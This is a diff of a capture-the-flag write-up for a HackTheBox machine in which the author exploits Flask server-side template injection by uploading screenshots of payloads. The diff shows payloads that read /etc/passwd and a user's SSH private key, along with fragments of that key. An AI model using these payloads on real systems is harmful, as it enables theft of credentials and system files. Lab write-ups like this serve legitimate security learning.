@@ -54,7 +54,7 @@ Now we can access http://images.late.htb/:
 If we pay attention, the title says "Flask", and this framework is known for Server-Side-Template-Injection issues. So if this application turn images into text we could pottenctially send an image containing a SSTI payload to test.
 
 ### Testing for Flask SSTI
-Lets start with the most simple payload: `{{7*7}}`. We can simply open any text editor, type in the payload, zoom in, and take a screenshot like below:
+Lets start with the most simple payload: `{%{{7*7}}%}`. We can simply open any text editor, type in the payload, zoom in, and take a screenshot like below:
 ![](images/7x7.png)
 Now we upload image to the website.
 
@@ -71,7 +71,7 @@ This means that the application/server executed a simple 7x7 mathematic equation
 ## Foothold
 Moving to another level now, lets see if we can get the `/etc/passwd` file. Googling around we can find multiple web sites with Flask SSTI payloads, after trying a couple ones  I found [this](https://medium.com/r3d-buck3t/rce-with-server-side-template-injection-b9c5959ad31e) one to be working:
 ```python
-{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+{%{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}%}
 ```
 
 *While testing the SSTI payloads, I found out that some fonts works better than others, and we need to have a very clear screenshot of the payload. To circunvent this, I used [Figma](https://www.figma.com) to create my screenshots.*
@@ -130,8 +130,8 @@ svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
 
 Which seems to be an interesting user with a `home` and a bash tty. During the nmap scan we saw that the SSH port is open. Using a guessing game, we can try to retrieve the SSH private key for this user. The payload looks like this:
 ```
-{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read()  
-}}
+{%{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read()  
+}}%}
 ```
 
 I had to change the font to `Roboto` to make it work this time!
@@ -144,26 +144,7 @@ And the `results.txt`:
 MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
 HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
 bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
-/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
-d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
-7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
-fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
-ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
-W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
-uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
-T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
-Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
-WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
-Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
-t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
-0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
-uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
-3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
-GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
-ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
-Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
-kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
-Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
+...<snip>...
 K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
 kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
 -----END RSA PRIVATE KEY-----
